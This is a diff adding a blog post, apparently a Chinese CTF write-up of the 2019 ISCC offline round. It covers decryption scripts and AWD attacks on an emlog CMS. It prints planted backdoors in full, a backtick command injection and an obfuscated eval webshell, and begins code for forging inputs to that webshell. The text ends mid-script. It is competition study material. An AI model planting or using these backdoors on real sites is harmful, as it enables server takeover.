@@ -134,6 +134,147 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-CTF比赛—2019ISCC线下赛WriteUp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/07/26/CTF比赛—2019ISCC线下赛WriteUp/">2019 ISCC — 线下赛WriteUp</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/07/26/CTF比赛—2019ISCC线下赛WriteUp/" class="archive-article-date">
+  	<time datetime="2019-07-25T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次比赛的赛程安排是上午解题，下午AWD。算是真正意义上第一次参加AWD比赛，记录一下学习的内容</p>
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.printable</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">pair = [</span><br><span class="line">    <span class="number">0x17F5B345</span>,<span class="number">0x17F5B30C</span>,</span><br><span class="line">    <span class="number">0xF16B77E2</span>,<span class="number">0xF16B77B1</span>,</span><br><span class="line">    <span class="number">0xB2B21947</span>,<span class="number">2998016260</span>,</span><br><span class="line">    <span class="number">0x58A9F98B</span>,<span class="number">1487534536</span>,</span><br><span class="line">    <span class="number">0x20A99D0A</span>,<span class="number">547986801</span>,</span><br><span class="line">    <span class="number">0x96D85B20</span>,<span class="number">2530761537</span>,</span><br><span class="line">    <span class="number">0xBBEA9A3E</span>,<span class="number">3152714326</span>,</span><br><span class="line">    <span class="number">0x35512DBE</span>,<span class="number">894512607</span>,</span><br><span class="line">    <span class="number">0x2838DCF7</span>,<span class="number">674815144</span>,</span><br><span class="line">    <span class="number">0x4EA1DF87</span>,<span class="number">1319231476</span>,</span><br><span class="line">    <span class="number">0xE22DCCED</span>,<span class="number">3794652292</span>,</span><br><span class="line">    <span class="number">0xDD2C662E</span>,<span class="number">3710674499</span>,</span><br><span class="line">    <span class="number">0x106B37C4</span>,<span class="number">275462068</span>,</span><br><span class="line">    <span class="number">0x46B4426E</span>,<span class="number">1186218498</span>,</span><br><span class="line">    <span class="number">0xAA67C7F4</span>,<span class="number">2858928017</span>,</span><br><span class="line">    <span class="number">0x72C06EBD</span>,<span class="number">1925213922</span>,</span><br><span class="line">    <span class="number">0xB0117F7F</span>,<span class="number">2953936653</span>,</span><br><span class="line">    <span class="number">0xF91B93EC</span>,<span class="number">4179334025</span>,</span><br><span class="line">    <span class="number">0xD43CE914</span>,<span class="number">3560761698</span>,</span><br><span class="line">    <span class="number">0xF6EA0CED</span>,<span class="number">4142533768</span>,</span><br><span class="line">    <span class="number">0x402A0997</span>,<span class="number">1076496869</span>,</span><br><span class="line">    <span class="number">0xADACB707</span>,<span class="number">2913777524</span>,</span><br><span class="line">    <span class="number">0xE79C5520</span>,<span class="number">3885782341</span>,</span><br><span class="line">    <span class="number">0x4B76BD4C</span>,<span class="number">1266072881</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(pair),<span class="number">2</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">if</span> ord(j) ^ pair[i] == pair[i+<span class="number">1</span>]:</span><br><span class="line">            flag += j</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><p>本次的MISC题目是<code>流量分析</code>+<code>RSA解密</code></p>
+<p>HTTP 流量有几个尝试注入的包，应该是迷惑用的</p>
+<p>题目给的 secret 文件，看格式像是 RSA 秘钥，看长度像是 RSA 私钥，于是添加私钥头补全</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">xxxx</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+<p>这里注意 secret 里是有两个私钥的，分别提出保存</p>
+<p>用 <code>tcp &amp;&amp; ip.dst == 10.0.0.0/8 &amp;&amp; !http</code> 规则过滤掉干扰包，发现一个 tcp 流里有疑似公钥的信息，以及一个 <code>secure message tool v1.0</code> 的明文，联想到题目给的  secret 私钥，于是分别提取出公钥，公钥头格式如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PUBLIC KEY-----</span><br><span class="line">xxx</span><br><span class="line">-----END RSA PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
+<p>然后构造脚本解密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcp.stream eq 128 and secret file</span></span><br><span class="line">files = [<span class="string">'a.pub'</span>, <span class="string">'a.pri'</span>, <span class="string">'b.pub'</span>, <span class="string">'b.pri'</span>]</span><br><span class="line">lst = &#123;</span><br><span class="line">    <span class="string">'a.pub'</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">'a.pri'</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">'b.pub'</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">'b.pri'</span>:<span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># load rsa key</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">    <span class="keyword">with</span> open(f, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">if</span> f.endswith(<span class="string">'pub'</span>):</span><br><span class="line">            lst[f] = rsa.PublicKey.load_pkcs1(fp.read().encode())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lst[f] = rsa.PrivateKey.load_pkcs1(fp.read().encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt messages from wireshark tcp.stream eq 128</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./messages.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> msg <span class="keyword">in</span> fp.readlines():</span><br><span class="line">        msg = msg.strip().split(<span class="string">':'</span>)</span><br><span class="line">        sender = msg[<span class="number">0</span>]</span><br><span class="line">        content = msg[<span class="number">1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">if</span> sender == <span class="string">'A'</span>:</span><br><span class="line">                plain_text = rsa.decrypt(content, lst[<span class="string">'a.pri'</span>])</span><br><span class="line">        <span class="keyword">elif</span> sender == <span class="string">'B'</span>:</span><br><span class="line">                plain_text = rsa.decrypt(content, lst[<span class="string">'b.pri'</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'&#123;&#125; =&gt; &#123;&#125;'</span>.format(sender, plain_text)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/1-1.png" alt="1-1"></p>
+<p>用私钥是能够成功解密的，但解密了一半抛异常，观察了一下解密出的信息，发现是一个类似握手的过程，其中确定了后续传输的加密方式为 <code>AES256 ECB</code> 模式以及传输秘钥 key</p>
+<p>key的长度是 32，符合 AES256 的要求，于是改了一下脚本，后续用 AES256 ECB 继续解密，得到所有传输的明文，脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcp.stream eq 128 and secret file</span></span><br><span class="line">files = [<span class="string">'a.pub'</span>, <span class="string">'a.pri'</span>, <span class="string">'b.pub'</span>, <span class="string">'b.pri'</span>]</span><br><span class="line"></span><br><span class="line">lst = &#123;</span><br><span class="line">    <span class="string">'a.pub'</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">'a.pri'</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">'b.pub'</span>:<span class="number">0</span>,</span><br><span class="line">    <span class="string">'b.pri'</span>:<span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># load rsa key</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">    <span class="keyword">with</span> open(f, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">if</span> f.endswith(<span class="string">'pub'</span>):</span><br><span class="line">            lst[f] = rsa.PublicKey.load_pkcs1(fp.read().encode())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lst[f] = rsa.PrivateKey.load_pkcs1(fp.read().encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># decrypt messages</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./messages.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> msg <span class="keyword">in</span> fp.readlines():</span><br><span class="line">        msg = msg.strip().split(<span class="string">':'</span>)</span><br><span class="line">        sender = msg[<span class="number">0</span>]</span><br><span class="line">        content = msg[<span class="number">1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> sender == <span class="string">'A'</span>:</span><br><span class="line">                    plain_text = rsa.decrypt(content, lst[<span class="string">'a.pri'</span>])</span><br><span class="line">            <span class="keyword">elif</span> sender == <span class="string">'B'</span>:</span><br><span class="line">                    plain_text = rsa.decrypt(content, lst[<span class="string">'b.pri'</span>])</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'&#123;&#125; =&gt; &#123;&#125;'</span>.format(sender, plain_text)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get AES256 ECB KEY = CZS3MgDiippCb67ojMpFRnPu9FfLvIn6</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">'CZS3MgDiippCb67ojMpFRnPu9FfLvIn6'</span></span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./ecb_messages.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> msg <span class="keyword">in</span> fp.readlines():</span><br><span class="line">        msg = msg.strip().split(<span class="string">':'</span>)</span><br><span class="line">        sender = msg[<span class="number">0</span>]</span><br><span class="line">        content = msg[<span class="number">1</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">        plain_text = aes.decrypt(content)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'&#123;&#125; =&gt; &#123;&#125;'</span>.format(sender, plain_text)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/1-2.png" alt="1-2"></p>
+<h2 id="AWD私地"><a href="#AWD私地" class="headerlink" title="AWD私地"></a>AWD私地</h2><p>本次比赛私地的使用的cms是<code>emblog 5.3.1</code></p>
+<p>我们的队伍只发现一个getshell的点，但是却需要进入后台利用。当发现时，几乎所有队伍都已经进入后台并改掉了密码，也没找到其他前台的漏洞，所以本次比赛并没有拿进攻分数。但是上的<code>Firewall</code>效果不错，防守分数并没有被扣掉太多。</p>
+<h3 id="1-文件上传getshell"><a href="#1-文件上传getshell" class="headerlink" title="1. 文件上传getshell"></a>1. 文件上传getshell</h3><p>前台没有找到其他漏洞，最后根据提示的<code>isccadmin</code>作为用户名，爆破拿到的密码是<code>passw0rd</code>。从后来的情况来看，所有队伍都做到了这一步，进入后台，修改了密码</p>
+<p>进入后台，有很多上传的点，我们是上传<code>管理员头像</code>处，上传了<code>一句话</code>，拿到了shell</p>
+<p>这个漏洞比较坑的是，前期管理员没有给上传的权限，之后有队伍反应，后来才又开了权限，才能上传</p>
+<h3 id="2-xmlrpc-php中的代码注入"><a href="#2-xmlrpc-php中的代码注入" class="headerlink" title="2. xmlrpc.php中的代码注入"></a>2. xmlrpc.php中的代码注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 向客户端发送api支持信息</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'rsd'</span>])) &#123;</span><br><span class="line">	$rsd=$_GET[<span class="string">'rsd'</span>];</span><br><span class="line">	<span class="keyword">echo</span> `$rsd`;</span><br><span class="line">	header(<span class="string">'Content-Type: text/xml; charset=utf-8'</span>, <span class="keyword">true</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="string">			&lt;rsd version="1.0" xmlns="http://archipelago.phrasewise.com/rsd"&gt;</span></span><br><span class="line"><span class="string">				&lt;service&gt;</span></span><br><span class="line"><span class="string">					&lt;engineName&gt;emlog&lt;/engineName&gt;</span></span><br><span class="line"><span class="string">					&lt;engineLink&gt;http://emlog.net/&lt;/engineLink&gt;</span></span><br><span class="line"><span class="string">					&lt;homePageLink&gt;'</span> . $options_cache[<span class="string">'blogurl'</span>] . <span class="string">'&lt;/homePageLink&gt;</span></span><br><span class="line"><span class="string">					&lt;apis&gt;</span></span><br><span class="line"><span class="string">						&lt;api name="MetaWeblog" blogID="1" preferred="true" apiLink="'</span> . $options_cache[<span class="string">'blogurl'</span>] . <span class="string">'xmlrpc.php" /&gt;</span></span><br><span class="line"><span class="string">						&lt;api name="Blogger" blogID="1" preferred="false" apiLink="'</span> . $options_cache[<span class="string">'blogurl'</span>] . <span class="string">'xmlrpc.php" /&gt;</span></span><br><span class="line"><span class="string">					&lt;/apis&gt;</span></span><br><span class="line"><span class="string">				&lt;/service&gt;</span></span><br><span class="line"><span class="string">			&lt;/rsd&gt;</span></span><br><span class="line"><span class="string">		 '</span>;</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中，注入点在于</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$rsd=$_GET[<span class="string">'rsd'</span>];</span><br><span class="line"><span class="keyword">echo</span> `$rsd`;</span><br></pre></td></tr></table></figure>
+<p>在php中，<code>反斜杠</code>可以用于快速执行cmd的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?rsd=chdir</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/2-1.png" alt="2-1"></p>
+<p>随便写个python测试，也可以直接执行</p>
+<p>比赛中就直接用这个方法去运行getflag程序，这样就无需再进入后台</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/ISCC%E7%BA%BF%E4%B8%8B%E8%B5%9B/2-2.png" alt="2-2"></p>
+<h3 id="3-代码混淆"><a href="#3-代码混淆" class="headerlink" title="3.  代码混淆"></a>3.  代码混淆</h3><p>在<code>include\model\log_model.php</code>的开头</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$o=<span class="string">'n();$r=@bas&#125;&gt;&#125;&gt;e64_encode(@x(&#125;&gt;@gzc&#125;&gt;o&#125;&gt;mpress($o),$&#125;&gt;k));p&#125;&gt;rint("&#125;&gt;$p$kh&#125;&gt;$r$kf");&#125;'</span>;</span><br><span class="line">$g=<span class="string">'&gt;EgwZ7H&#125;&gt;iEecl&#125;&gt;S";function &#125;&gt;x($t,$&#125;&gt;k)&#123;$&#125;&gt;&#125;&gt;c=s&#125;&gt;trlen(&#125;&gt;$k)&#125;&gt;;$l=strlen($t);$o="'</span>;</span><br><span class="line">$l=<span class="string">'";&#125;&gt;f&#125;&gt;or($i=0;$&#125;&gt;&#125;&gt;i&lt;$l;)&#123;for($&#125;&gt;j=&#125;&gt;0;&#125;&gt;&#125;&gt;($j&lt;$c&amp;&amp;$i&lt;$l&#125;&gt;);$j++,$i++)&#123;$o.&#125;&gt;&#125;&gt;=$'</span>;</span><br><span class="line">$r=<span class="string">'_contents&#125;&gt;("p&#125;&gt;&#125;&gt;hp://i&#125;&gt;nput")&#125;&gt;,$m)==1)&#123;@ob_star&#125;&gt;t(&#125;&gt;);@&#125;&gt;eva&#125;&gt;l(@gzu&#125;&gt;ncompress('</span>;</span><br><span class="line">$L=<span class="string">'$k="5ac&#125;&gt;91f7&#125;&gt;d";$&#125;&gt;kh=&#125;&gt;&#125;&gt;"b9615a29&#125;&gt;bc1d";&#125;&gt;$kf="24d0b67&#125;&gt;c2c91";$p&#125;&gt;="9GmI&#125;&gt;&#125;'</span>;</span><br><span class="line">$s=str_replace(<span class="string">'C'</span>,<span class="string">''</span>,<span class="string">'cCreaCteC_fCuCCnction'</span>);</span><br><span class="line">$Z=<span class="string">'t&#123;$i&#125;^&#125;&gt;$k&#123;$&#125;&gt;j&#125;&gt;&#125;;&#125;&#125;ret&#125;&gt;urn $o;&#125;&#125;&gt;if(@preg_match&#125;&gt;&#125;&gt;("&#125;&gt;/$kh(.+&#125;&gt;)$kf&#125;&gt;/",@file_&#125;&gt;get'</span>;</span><br><span class="line">$h=<span class="string">'@x(@ba&#125;&gt;se64&#125;&gt;_d&#125;&gt;ecode($m[1])&#125;&gt;,$&#125;&gt;&#125;&gt;k)))&#125;&gt;;&#125;&gt;$o=@&#125;&gt;ob_get_contents();@ob_&#125;&gt;en&#125;&gt;d_cl&#125;&gt;ea'</span>;</span><br><span class="line">$q=str_replace(<span class="string">'&#125;&gt;'</span>,<span class="string">''</span>,$L.$g.$l.$Z.$r.$h.$o);</span><br><span class="line">$I=$s(<span class="string">''</span>,$q);$I();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>打印<code>$s</code>和<code>$q</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  $s的结果</span></span><br><span class="line">create_function</span><br><span class="line">   </span><br><span class="line"><span class="comment">#  $q的结果</span></span><br><span class="line">$k=<span class="string">"5ac91f7d"</span>;</span><br><span class="line">$kh=<span class="string">"b9615a29bc1d"</span>;</span><br><span class="line">$kf=<span class="string">"24d0b67c2c91"</span>;</span><br><span class="line">$p=<span class="string">"9GmIEgwZ7HiEeclS"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">($t,$k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $c=strlen($k);</span><br><span class="line">    $l=strlen($t);</span><br><span class="line">    $o=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$l;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)</span><br><span class="line">        &#123;</span><br><span class="line">            $o.=$t&#123;$i&#125;^$k&#123;$j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(@preg_match(<span class="string">"/$kh(.+)$kf/"</span>,@file_get_contents(<span class="string">"php://input"</span>),$m)==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  	@ob_start();</span><br><span class="line">    @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode($m[<span class="number">1</span>]),$k)));</span><br><span class="line">    $o=@ob_get_contents();</span><br><span class="line">    @ob_end_clean();</span><br><span class="line">    $r=@base64_encode(@x(@gzcompress($o),$k));</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">"$p$kh$r$kf"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>解释一下几个函数：</p>
+<p>①<code>gzcompress()</code>：压缩内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gzcompress ( string $data [, int $level = -1 [, int $encoding = ZLIB_ENCODING_DEFLATE ]] ) : string</span><br><span class="line"></span><br><span class="line">data</span><br><span class="line">The data to compress.</span><br><span class="line"></span><br><span class="line">level</span><br><span class="line">The level of compression. Can be given as 0 for no compression up to 9 for maximum compression.</span><br><span class="line"></span><br><span class="line">If -1 is used, the default compression of the zlib library is used which is 6.</span><br><span class="line"></span><br><span class="line">encoding</span><br><span class="line">One of ZLIB_ENCODING_* constants.</span><br></pre></td></tr></table></figure>
+<p>②<code>gzuncompress()</code>：解压缩内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gzuncompress ( string $data [, int $length = 0 ] ) : string</span><br><span class="line"></span><br><span class="line">data</span><br><span class="line">The data compressed by gzcompress().</span><br><span class="line"></span><br><span class="line">length</span><br><span class="line">The maximum length of data to decode.</span><br></pre></td></tr></table></figure>
+<p>③<code>preg_match</code>()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] ) : int</span><br><span class="line"></span><br><span class="line">pattern：要搜索的模式，字符串类型。</span><br><span class="line"></span><br><span class="line">subject：输入字符串。</span><br><span class="line"></span><br><span class="line">matches：如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</span><br></pre></td></tr></table></figure>
+<p>④<code>ob_start()</code>、<code>ob_get_contents()</code>、<code>ob_end_clean()</code>、三个函数实现缓冲本地文件，以及执行本地脚本代码。使用ob_start()把输出那同输出到缓冲区，而不是到浏览器。然后用ob_get_contents得到缓冲区的数据。ob_start()在服务器打开一个缓冲区来保存所有的输出。所以在任何时候使用echo，输出都将被加入缓冲区中，直到程序运行结束或者使用ob_flush()来结束。然后在服务器中缓冲区的内容才会发送到浏览器，由浏览器来解析显示。函数ob_end_clean会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。  </p>
+<p>那么<code>function x</code>的作用其实就是对两个字符串内容异或，有点类似于加密。利用<code>$t</code>和<code>$k</code>生成<code>$o</code>，假设我们不知道<code>$t</code>的内容，只要将<code>$o</code>放在<code>$t</code>的位置，就可以生成<code>$t</code></p>
+<p>我们通过逆推，用如下代码生成<code>phpinfo();</code>的字符串，构成<code>$kh</code> + <code>生成的字符串</code> + <code>$kf</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$k=<span class="string">"5ac91f7d"</span>;</span><br><span class="line">$kh=<span class="string">"b9615a29bc1d"</span>;</span><br><span class="line">$kf=<span class="string">"24d0b67c2c91"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">($t,$k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $c=strlen($k);</span><br><span class="line">    $l=strlen($t);</span><br><span class="line">    $o=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$l;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>($j=<span class="number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)</span><br><span class="line">        &#123;</span><br><span class="line">            $o.=$t&#123;$i&#125;^$k&#123;$j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $o;</span><br><span 